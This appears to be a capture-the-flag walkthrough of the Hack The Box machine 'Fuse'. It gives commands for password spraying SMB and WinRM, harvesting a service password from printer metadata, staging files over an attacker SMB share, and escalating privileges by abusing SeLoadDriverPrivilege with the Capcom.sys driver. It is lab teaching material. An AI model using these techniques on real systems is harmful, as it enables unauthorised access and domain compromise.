```bash
sudo nmap -sC -sV -oA nmap/initial 10.10.10.193

Going to port 80, we are redirected to `http://fuse.fabricorp.local/papercut/logs/html/index.htm`, so we add this to hosts file:

```bash
echo -e "\n\n#HTB\n10.10.10.193 fuse.htb fuse.fabricorp.local fabricorp.local\n" | sudo tee -a /etc/hosts
```

We can see this web interface in front of us:

![image-20201024160036103]({{ site.url }}/assets/fuse/image-20201024160036103.png)

Watching the printer logs, we can see a bunch of user names, we can put the in a file that we call `users.txt`.

```
# users.txt
pmerton
tlavel
sthompson
bhult
administrator
```

Now we have to generate a word list for possible passwords, after I tried with classic `rockyou.txt` I tried with `cewl` on the main site:

```bash
cewl -d 5 -m 3  "http://fuse.fabricorp.local/papercut/logs/html/index.htm" --with-numbers > pass_wordlist.txt
```

 And trying password spray on all login names:

![image-20201024181235149]({{ site.url }}/assets/fuse/image-20201024181235149.png)

And eventually, credentials are found:

```
...
[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: '.\tlavel:Fabricorp01'
...
[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: '.\bhult:Fabricorp01'
...
```

When trying to login into `tlavel`, we get:

![image-20201024182201752]({{ site.url }}/assets/fuse/image-20201024182201752.png)

And after some research, I found [this forum question](https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password) (if you can't read play a little with F12), which gave me the answer to my problem:

```bash
smbpasswd -r 10.10.10.193 -U tlavel
```

Note that the new password should be different from the old and with the same length, with the same number on capitalized letters and numbers. I choose `Lolzcorp01`. Hopping on RPC, let's enumerate a little more:

```
rpcclient -U FABRICORP\\tlavel 10.10.10.193

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]
user:[tlavel] rid:[0x642]
user:[pmerton] rid:[0x643]
user:[svc-scan] rid:[0x645]
user:[bhult] rid:[0x1bbd]
user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]

rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]
```

We found a password, now what you should do is try that password with your user list (updated with the user list of the `rpcclient` command) in `evil-winrm`.

```bash
_pass='$fab@s3Rv1ce$1' 
for user in $( cat ./users.txt ); do evil-winrm -i 10.10.10.193 -u "$user" -p "$_pass" && echo "$user:$_pass" >> creds.txt; done
```

But after a little research, I discovered this Metasploit module `auxiliary/scanner/winrm/winrm_login`, which was way faster:

![image-20201024185240383]({{ site.url }}/assets/fuse/image-20201024185240383.png)

Then, login with the correct user and password:

![image-20201024185523943]({{ site.url }}/assets/fuse/image-20201024185523943.png)

To get some files into the box, I created a temporary smb share on the attacker machine:

![image-20201024190419653]({{ site.url }}/assets/fuse/image-20201024190419653.png)

And connected to it from the box with the [powershell method](https://community.spiceworks.com/topic/2219152-powershell-mapping-network-drive):

```powershell
$password = ConvertTo-SecureString "lolz" -AsPlainText -Force
$credentials = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "lolz",$password
New-PSDrive -Name L -PSProvider FileSystem -Root "\\10.10.14.86\lolz" -Credential $credentials
```

![image-20201024192002890]({{ site.url }}/assets/fuse/image-20201024192002890.png)

And now let's load [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat) into our share and let's execute it from the box. From the output, we understand that our regular user has administrator's privileges with `SeLoadDriverPrivilege`. Now, to exploit this privilege, we can follow the instructions in [this article](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/). Basically, to run the exploit, we should

> At this point we can use the PoC tool EOPLOADDRIVER (https://github.com/TarlogicSecurity/EoPLoadDriver/), which will allow us to:
>
> * Enable the **SeLoadDriverPrivilege** privilege
>
> * Create the registry key under HKEY_CURRENT_USER (HKCU) and set driver configuration settings
>
> * Execute the **NTLoadDriver** function, specifying the registry key previously created

```bash
wget "https://github.com/TarlogicSecurity/EoPLoadDriver/raw/master/eoploaddriver.cpp"
wget "https://github.com/FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys"
git clone "https://github.com/tandasat/ExploitCapcom"
```

Now you should hop in a Windows machine and compile the C++ code editing the command that you want to be executed, but while I was looking for more information, I stumbled in [this merged pull request](https://github.com/rapid7/metasploit-framework/pull/7363) that could make everything way easier, but unfortunately my Metasploit console wouldn't accept my credentials... So... Back to the boring method:

```powershell
# Powershell on Windows machine (mingw required)
g++ .\eoploaddriver.cpp -o eoploaddriver.exe
# Edit the launched string in ExploitCapcom and recompile
```

Copy the files in whatever folder, then:

![image-20201025015005268]({{ site.url }}/assets/fuse/image-20201025015005268.png)

![image-20201025015103961]({{ site.url }}/assets/fuse/image-20201025015103961.png)

...profit!
